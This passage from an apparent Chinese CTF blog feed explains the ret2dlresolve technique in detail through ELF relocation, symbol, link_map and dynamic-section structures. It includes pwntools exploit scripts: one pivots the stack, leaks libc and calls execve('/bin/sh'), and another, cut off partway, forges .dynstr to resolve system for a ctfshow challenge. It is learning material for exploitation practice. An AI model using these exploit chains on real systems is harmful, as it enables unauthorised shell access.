class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./demo0&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">sh = process(&#x27;./demo0&#x27;)</span><br><span class="line">#gdb.attach(sh, &#x27;b *0x8048413\nc&#x27;)</span><br><span class="line">pop_ebx = 0x08048359</span><br><span class="line">pop_3 = 0x080485b9</span><br><span class="line">pop_esp = 0x08048557</span><br><span class="line">src_addr = 0x0804A060</span><br><span class="line">base_stage = 0x200</span><br><span class="line">bss_addr = src_addr + base_stage</span><br><span class="line">pivot_addr = bss_addr + 0x4</span><br><span class="line"></span><br><span class="line">payload = cyclic(base_stage) + p32(elf.symbols[&#x27;puts&#x27;]) + p32(pop_ebx) + p32(elf.got[&#x27;puts&#x27;])</span><br><span class="line">payload += p32(elf.symbols[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr - 0x100) + p32(0x40) + p32(pop_esp) + p32(bss_addr - 0x100)</span><br><span class="line">sh.sendafter(&#x27;pwn me!\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x44) + p32(pivot_addr)</span><br><span class="line">sh.sendafter(&#x27;ret_addr\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">puts_got = u32(sh.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">success(hex(puts_got))</span><br><span class="line">libc.address = puts_got - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">payload = p32(libc.symbols[&#x27;execve&#x27;]) + p32(pop_3) + p32(next(libc.search(&#x27;/bin/sh\x00&#x27;))) + p32(0) + p32(0) + p32(0xdeadbeef)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve超详解</title>
      <link href="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/"/>
      <url>/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2dlresovle攻击原理"><a href="#ret2dlresovle攻击原理" class="headerlink" title="ret2dlresovle攻击原理"></a>ret2dlresovle攻击原理</h2><p>ret2dlresovle攻击的本质就是在于程序在动态链接时篡改相关结构体，让程序解析到错误的函数，进而达成攻击</p><h3 id="Lazy-Binding"><a href="#Lazy-Binding" class="headerlink" title="Lazy Binding"></a>Lazy Binding</h3><p>当程序在第一次调用某个函数时，会调用_dl_runtime_resolve函数从libc中获取这个函数的真实地址</p><p>那么具体是怎么实现的呢？</p><p>动态链接的程序调用函数时会先call一个函数的plt表，如read@plt，执行read@plt表里的第一条指令，read@plt表里的第一条指令是jmp到got表中，执行got表里存放的地址所指向的指令，got表默认存放的是read@plt中下一条指令的地址，通过_dl_runtime_resolve函数解析libc中的真实地址后会将函数的真实地址填入到该函数的got表中</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-04_18-24-55-1745939812038-1.png" alt="Snipaste_2025-03-04_18-24-55"></p><p><strong>_dl_runtime_resolve</strong>函数有两个参数，一个是reloc_index(<strong>reloc_index参数标识了具体要导入哪个函数</strong>)，一个是link_map的地址</p><p>这里和普通函数调用方式不一样，会先push一个reloc_index，然后跳转到一个地址，push link_map的地址</p><p>然后再跳转到_dl_runtime_resolve，我们会发现dl_runtime_resolve函数最终调用的是_dl_fixup函数</p><p>也就是最终解析在libc中真实地址的函数</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-04_18-24-55-1741084407261-2-1745939812039-3.png" alt="Snipaste_2025-03-04_18-24-55"></p><h3 id="Related-Dynamic-Sections"><a href="#Related-Dynamic-Sections" class="headerlink" title="Related Dynamic Sections"></a>Related Dynamic Sections</h3><p>在深入了解_dl_runtime_resolve函数是怎么寻找到真实地址之前我们需要先了解几个基本结构体</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/ret2dlresolve--2.related-sections-1745939812039-5.png" alt="ret2dlresolve--2.related-sections"></p><h4 id="Elf-Rel结构体"><a href="#Elf-Rel结构体" class="headerlink" title="Elf_Rel结构体"></a>Elf_Rel结构体</h4><p>Elf_Rel实例化的每一个项组成了.rel.plt节</p><p>ELF 文件中的 <code>.rel.plt</code> 是一个 <strong>重定位表（Relocation Table）</strong>，用于存储 <strong>PLT（Procedure Linkage Table）</strong> 相关的重定位信息，主要用于延迟绑定（Lazy Binding）。</p><p>我们只关心Elf_Rel结构体的两个域，一个是r_offset一个是r_info，r_offset是用于告诉解析真实地址的函数解析后的地址往哪里写(这些也就组成了got表)，r_info则是当前项所代表的函数在.dynsym节中的偏移，下面放出Elf_Rel结构体的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/* Elf_Rel size: 32 bit = 8B  </span><br><span class="line">                 64 bit = 24B</span><br><span class="line">*/</span><br><span class="line">typedef struct &#123;</span><br><span class="line">     Elf32_Addr r_offset; // 对应.got.plt表项的地址，解析后要回写的</span><br><span class="line">     Elf32_Word r_info;  // .dynsym表的下标(r_info &gt;&gt; 8)</span><br><span class="line"> &#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Elf64_Addr r_offset; // 对应.got.plt表项的地址，解析后要回写的</span><br><span class="line">    Elf64_Xword r_info; // .dynsym表的下标(r_info &gt;&gt; 8)</span><br><span class="line">    Elf64_Sxword r_addend;</span><br><span class="line"> &#125; Elf64_Rel;</span><br></pre></td></tr></table></figure><h4 id="Elf-Sym结构体"><a href="#Elf-Sym结构体" class="headerlink" title="Elf_Sym结构体"></a>Elf_Sym结构体</h4><p>符号表（Symbol Table）用于记录程序中所有函数和全局变量的信息。每个符号在符号表中对应一个条目，这些条目由 <code>Elf32_Sym</code> 或 <code>Elf64_Sym</code> 结构体表示</p><p>我们在ELF32_Sym主要关心st_name，st_name是当前项所代表的函数在.dynstr节中的偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">      Elf32_Word    st_name;         /* 4B .dynstr中的字符串偏移 */</span><br><span class="line">      Elf32_Addr    st_value;        /* 4B （无需关心，置0）符号的值，一般为虚拟地址*/</span><br><span class="line">      Elf32_Word    st_size;         /* 4B （无需关心，置0）符号的大小，如果为0则表示该符号无需大小或大小未知 */</span><br><span class="line">      unsigned char    st_info;      /* 1B  符号的类型和绑定特征。高4位为符号的绑定特征，低4位为符号类型 */</span><br><span class="line">      unsigned char    st_other;     /* 1B （无需关心，置0）符号的可见性，0为默认符号可见性规则 */</span><br><span class="line">      Elf32_Section    st_shndx;     /* 2B （无需关心，置0）符号所在的section对应的section header的索引号，0为未定义节 */</span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line">//含义同上</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Elf64_Word st_name;</span><br><span class="line">    unsigned char st_info;</span><br><span class="line">    unsigned char st_other;</span><br><span class="line">    Elf64_Section st_shndx;</span><br><span class="line">    Elf64_Addr st_value;</span><br><span class="line">    Elf64_Xword st_size;</span><br><span class="line">&#125;Elf64_Sym;</span><br></pre></td></tr></table></figure><h4 id="dynstr节"><a href="#dynstr节" class="headerlink" title="dynstr节"></a>dynstr节</h4><p>在动态链接过程中，<code>.dynstr</code> 节与 <code>.dynsym</code> 节协同工作。<code>.dynsym</code> 节保存需要动态链接的符号表，每个符号都有一个 <code>st_name</code> 字段，该字段是一个索引，指向 <code>.dynstr</code> 节中相应符号名称的起始位置</p><p>.dynstr节是用来存放动态链接中所需解析的函数名的</p><h4 id="link-map结构体"><a href="#link-map结构体" class="headerlink" title="link_map结构体"></a>link_map结构体</h4><p><code>link_map</code>是描述已加载的共享对象的结构体，采用双链表管理，该数据结构保存在<code>ld.so</code>的<code>.bss</code>段中。我们主要关注其中几个域</p><ol><li><p><code>l_addr</code>：共享对象的加载基址；</p></li><li><p><code>l_next</code>，<code>l_prev</code>：管理<code>link_map</code>的双链表指针；</p></li><li><p><code>l_info</code>：保存<code>Elfxx_Dyn</code>结构体指针的列表，用来寻找各节基址；如<code>l_info[DT_STRTAB]</code>指向保存着函数解析字符串表基址的<code>Elfxx_Dyn</code>结构体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/* 描述已加载共享对象的结构体。`l_next` 和 `l_prev` 成员</span><br><span class="line">   形成了在启动时加载的所有共享对象的链表。</span><br><span class="line">   这些数据结构存在于运行时动态链接器使用的空间中；</span><br><span class="line">   修改它们可能会导致严重后果。</span><br><span class="line">   如果有必要，这个数据结构在未来可能会改变。</span><br><span class="line">   用户级程序必须避免定义此类型的对象。  */</span><br><span class="line">struct link_map</span><br><span class="line">  &#123;</span><br><span class="line">    /* 以下几个成员是与调试器协议的一部分。</span><br><span class="line">       这与 SVR4 中使用的格式相同。  */</span><br><span class="line">    ElfW(Addr) l_addr;             /* ELF 文件中的地址与内存中地址之间的差异。  */</span><br><span class="line">    char *l_name;                  /* 对象文件的绝对路径名。  */</span><br><span class="line">    ElfW(Dyn) *l_ld;               /* 共享对象的动态段。  */</span><br><span class="line">    struct link_map *l_next, *l_prev; /* 已加载对象的链表。  */</span><br><span class="line"></span><br><span class="line">    /* 以下所有成员仅供动态链接器内部使用。</span><br><span class="line">       它们可能会在没有通知的情况下更改。  */</span><br><span class="line"></span><br><span class="line">    /* 当在多个命名空间中使用时，这个元素与指向相同类型的副本的指针不同。  */</span><br><span class="line">    struct link_map *l_real;</span><br><span class="line"></span><br><span class="line">    /* 此 link map 所属的命名空间的编号。  */</span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    struct libname_list *l_libname;</span><br><span class="line"></span><br><span class="line">    /* 动态段信息数组。 */</span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"></span><br><span class="line">    const ElfW(Phdr) *l_phdr;      /* 指向内存中程序头表的指针。  */</span><br><span class="line">    ElfW(Addr) l_entry;            /* 入口点位置。  */</span><br><span class="line">    ElfW(Half) l_phnum;            /* 程序头表条目数量。  */</span><br><span class="line">    ElfW(Half) l_ldnum;            /* 动态段条目数量。  */</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></li></ol><h4 id="Elfxx-Dyn结构体"><a href="#Elfxx-Dyn结构体" class="headerlink" title="Elfxx_Dyn结构体"></a>Elfxx_Dyn结构体</h4><p>Elf(32&#x2F;64)_Dyn结构体存放在<code>.dynamic</code>节中，说具体些就是键值对，关键字是各个动态段的标识，值则是各个动态段的对应的基址，包括之前说的的<code>.ret.plt</code>、<code>.dynsym</code>、<code>dynstr</code>节等。其主要作用就是在解析函数地址时使用这些键值对来找到各个动态段的基址，以确定数据条目的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Sword   d_tag;                  /* Dynamic entry type */</span><br><span class="line">  union                                 </span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;                 /* Integer value */</span><br><span class="line">      Elf32_Addr d_ptr;                 /* Entry Address */</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword        d_tag;           /* Dynamic entry type */</span><br><span class="line">  union</span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;               /* Integer value */</span><br><span class="line">      Elf64_Addr d_ptr;                /* Address value */</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p><code>d_tag</code>定义如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/* Legal values for d_tag (dynamic entry type).  */</span><br><span class="line">#define DT_NULL                0                /* Marks end of dynamic section */</span><br><span class="line">#define DT_NEEDED              1                /* Name of needed library */</span><br><span class="line">#define DT_PLTRELSZ            2                /* Size in bytes of PLT relocs */</span><br><span class="line">#define DT_PLTGOT              3                /* Processor defined value */</span><br><span class="line">#define DT_HASH                4                /* Address of symbol hash table */</span><br><span class="line">#define DT_STRTAB              5                /* Address of string table */</span><br><span class="line">#define DT_SYMTAB              6                /* Address of symbol table */</span><br><span class="line">#define DT_RELA                7                /* Address of Rela relocs */</span><br><span class="line">#define DT_RELASZ              8                /* Total size of Rela relocs */</span><br><span class="line">#define DT_RELAENT             9                /* Size of one Rela reloc */</span><br><span class="line">#define DT_STRSZ              10                /* Size of string table */</span><br><span class="line">#define DT_SYMENT             11                /* Size of one symbol table entry */</span><br><span class="line">#define DT_INIT               12                /* Address of init function */</span><br><span class="line">#define DT_FINI               13                /* Address of termination function */</span><br><span class="line">#define DT_SONAME             14                /* Name of shared object */</span><br><span class="line">#define DT_RPATH              15                /* Library search path (deprecated) */</span><br><span class="line">#define DT_SYMBOLIC           16                /* Start symbol search here */</span><br><span class="line">#define DT_REL                17                /* Address of Rel relocs */</span><br><span class="line">#define DT_RELSZ              18                /* Total size of Rel relocs */</span><br><span class="line">#define DT_RELENT             19                /* Size of one Rel reloc */</span><br><span class="line">#define DT_PLTREL             20                /* Type of reloc in PLT */</span><br><span class="line">#define DT_DEBUG              21                /* For debugging; unspecified */</span><br><span class="line">#define DT_TEXTREL            22                /* Reloc might modify .text */</span><br><span class="line">#define DT_JMPREL             23                /* Address of PLT relocs */</span><br><span class="line">#define DT_BIND_NOW           24                /* Process relocations of object */</span><br><span class="line">#define DT_INIT_ARRAY         25                /* Array with addresses of init fct */</span><br><span class="line">#define DT_FINI_ARRAY         26                /* Array with addresses of fini fct */</span><br><span class="line">#define DT_INIT_ARRAYSZ       27                /* Size in bytes of DT_INIT_ARRAY */</span><br><span class="line">#define DT_FINI_ARRAYSZ       28                /* Size in bytes of DT_FINI_ARRAY */</span><br><span class="line">#define DT_RUNPATH            29                /* Library search path */</span><br><span class="line">#define DT_FLAGS              30                /* Flags for the object being loaded */</span><br><span class="line">#define DT_ENCODING           32                /* Start of encoded range */</span><br><span class="line">#define DT_PREINIT_ARRAY      32                /* Array with addresses of preinit fct*/</span><br><span class="line">#define DT_PREINIT_ARRAYSZ    33                /* size in bytes of DT_PREINIT_ARRAY */</span><br><span class="line">#define DT_SYMTAB_SHNDX       34                /* Address of SYMTAB_SHNDX section */</span><br><span class="line">#define DT_NUM                35                /* Number used */</span><br></pre></td></tr></table></figure><p>我们需要关心的也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define DT_STRTAB              5                /* Address of string table */</span><br><span class="line">#define DT_SYMTAB              6                /* Address of symbol table */</span><br><span class="line">#define DT_JMPREL             23                /* Address of PLT relocs */</span><br></pre></td></tr></table></figure><p>分别存放了dynstr节、dynsym节、.rel.plt节的基址</p><p>那么我们各个节在内存中的具体结构如图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">===============================================</span><br><span class="line">|      Related sections       |   Structure   |</span><br><span class="line">===============================================</span><br><span class="line">|          .dynamic           | Elf_Dyn entry |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    Functions    | Variables |      ---      |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    .ret.plt     | .ret.dyn  | Elf_Rel entry |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    .dynsym      | .dynsym   | Elf_Sym entry |</span><br><span class="line">+-----------------+-----------+---------------+</span><br><span class="line">|    .dynstr      | .dynstr   | Strings       |</span><br><span class="line">+-----------------+-----------+---------------+</span><br></pre></td></tr></table></figure><h3 id="大概解析流程"><a href="#大概解析流程" class="headerlink" title="大概解析流程"></a>大概解析流程</h3><p>下面直接放张图方便理解</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/202406051458206-1745939812039-7.png" alt="img"></p><h3 id="动态调式查看具体解析流程"><a href="#动态调式查看具体解析流程" class="headerlink" title="动态调式查看具体解析流程"></a>动态调式查看具体解析流程</h3><p>直接这样说肯定不足以深入理解的，所以接下来会通过动态调式来查看具体解析流程</p><h4 id="确定link-map中l-info的地址"><a href="#确定link-map中l-info的地址" class="headerlink" title="确定link_map中l_info的地址"></a>确定link_map中l_info的地址</h4><p>不同的glibc版本l_info可能不同，网上并没有找到一个准确的偏移</p><p>但是通过观察link_map结构体不难发现l_info之前的成员有8个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l_addr</span><br><span class="line">l_name</span><br><span class="line">l_ld</span><br><span class="line">l_next</span><br><span class="line">l_prev</span><br><span class="line">l_real</span><br><span class="line">l_ns</span><br><span class="line">l_libname</span><br></pre></td></tr></table></figure><p>那么通常情况下偏移应该就是0x20(调式环境为32位，如果是64位偏移通常应该是0x40)</p><p>知道了l_info的地址，就可以通过相关的d_tag的地址找到我们需要的段的基地址了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define DT_STRTAB              5                /* Address of string table */</span><br><span class="line">#define DT_SYMTAB              6                /* Address of symbol table */</span><br><span class="line">#define DT_JMPREL             23                /* Address of PLT relocs */</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-04_23-43-35-1745939812039-9.png" alt="Snipaste_2025-03-04_23-43-35"></p><h4 id="确定动态链接所需的几个节的地址"><a href="#确定动态链接所需的几个节的地址" class="headerlink" title="确定动态链接所需的几个节的地址"></a>确定动态链接所需的几个节的地址</h4><p>然后我们通过d_tag找到对应段的基地址</p><p>这里给出一个公式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DT_xxx_addr = ptr [l_info_addr + lenth * (offset - 1)]</span><br><span class="line">lenth为字长</span><br><span class="line">offset位DT_xxx对应于l_info的条目</span><br></pre></td></tr></table></figure><h5 id="dynstr-addr"><a href="#dynstr-addr" class="headerlink" title="dynstr_addr"></a>dynstr_addr</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_STRTAB_addr = ptr [0xf7ffda44 + 0x4 * (5 - 1)] = 0x8049804</span><br></pre></td></tr></table></figure><p>我们可以发现动态调试和我们在IDA里看到的却是是一样的</p><p>dynstr的地址是0x0804824C</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_STRTAB_addr = ptr [l_info_addr + 0x4 * (5-1)]</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-05_00-07-40-1745939812039-13.png" alt="Snipaste_2025-03-05_00-07-40"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305002003747-1745939812039-11.png" alt="image-20250305002003747"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305002029521-1745939812039-15.png" alt="image-20250305002029521"></p><h5 id="dynsym-addr"><a href="#dynsym-addr" class="headerlink" title="dynsym_addr"></a>dynsym_addr</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_SYMTAB_addr = ptr [0xf7ffda44 + 0x4 * (6 - 1)] = 0x804980c</span><br></pre></td></tr></table></figure><p>dynsym的地址是0x080481AC</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003048577-1745939812039-17.png" alt="image-20250305003048577"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003232146-1745939812039-19.png" alt="image-20250305003232146"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003304085-1745939812039-21.png" alt="image-20250305003304085"></p><h5 id="rel-plt-addr"><a href="#rel-plt-addr" class="headerlink" title=".rel.plt_addr"></a>.rel.plt_addr</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DT_JMPREL_addr = ptr [0xf7ffda44 + 0x4 * (23 - 1)] = 0x8049844</span><br></pre></td></tr></table></figure><p>.rel.plt的地址是0x8048304</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305004030135.png" alt="image-20250305004030135"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003736753.png" alt="image-20250305003736753"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305003844655.png" alt="image-20250305003844655"></p><h4 id="通过read函数来观察是怎么找到符号名称的"><a href="#通过read函数来观察是怎么找到符号名称的" class="headerlink" title="通过read函数来观察是怎么找到符号名称的"></a>通过read函数来观察是怎么找到符号名称的</h4><p>read函数的reloc_index是8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r_info = ptr [.rel.plt_addr + reloc_index + lenth] = 0x207</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305004650994.png" alt="image-20250305004650994"><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305005337679.png" alt="image-20250305005337679"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">st_name = ptr [dynsym_addr + (r_info&gt;&gt;8) * 0x10] = 0x27</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305011200923.png" alt="image-20250305011200923"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_str = ptr [.dynstr_addr + st_name] = /* &#x27;read&#x27; */</span><br></pre></td></tr></table></figure><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305011401972.png" alt="image-20250305011401972"></p><h2 id="ret2dlresolve之No-Relro"><a href="#ret2dlresolve之No-Relro" class="headerlink" title="ret2dlresolve之No-Relro"></a>ret2dlresolve之No-Relro</h2><h3 id="32位下No-Relro"><a href="#32位下No-Relro" class="headerlink" title="32位下No-Relro"></a>32位下No-Relro</h3><p>以ctfshow中的pwn82为例</p><p>进入到ctfshow函数中，发现有溢出点</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/image-20250305185526111.png" alt="image-20250305185526111"></p><p>因为是No-Relro所以.dynamic可写，那么我们直接将.dynamic中的DT_STRTAB的值给改成我们恶意伪造在bss段上的.dynstr节(将任意函数名替换成system)的地址就可以直接进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = remote(&#x27;pwn.challenge.ctf.show&#x27;,28268)</span><br><span class="line">#sh = process(&#x27;./pwn1&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn1&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(sh, &#x27;b *0x8048513\nc&#x27;)</span><br><span class="line">pop_3 = 0x08048629</span><br><span class="line">read_plt_next = 0x08048376</span><br><span class="line">bss_addr = 0x080498E0</span><br><span class="line"></span><br><span class="line">DT_STRTAB_addr = 0x08049808</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">fake_dynstr = dynstr.replace(b&#x27;read&#x27;,b&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x6C + 0x4) + p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(DT_STRTAB_addr) + p32(4)</span><br><span class="line">payload += p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr + 0x100) + p32(len(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">payload += p32(elf.sym[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr) + p32(len(fake_dynstr))</span><br><span class="line">payload += p32(read_plt_next) + p32(0xdeadbeef) + p32(bss_addr + 